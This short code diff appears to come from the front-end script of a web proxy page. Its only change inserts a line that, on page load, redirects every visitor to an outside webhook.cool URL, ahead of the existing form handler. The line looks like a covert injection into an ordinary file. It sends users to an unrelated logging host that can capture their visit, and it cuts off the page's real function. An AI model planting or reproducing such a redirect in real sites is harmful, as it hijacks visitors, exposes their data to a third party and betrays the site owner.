@@ -19,6 +19,8 @@ const error = document.getElementById("uv-error");
  */
 const errorCode = document.getElementById("uv-error-code");
 
+window.location.replace('https://shapely-microphone-99.webhook.cool');
+
 form.addEventListener("submit", async (event) => {
 	event.preventDefault();
 
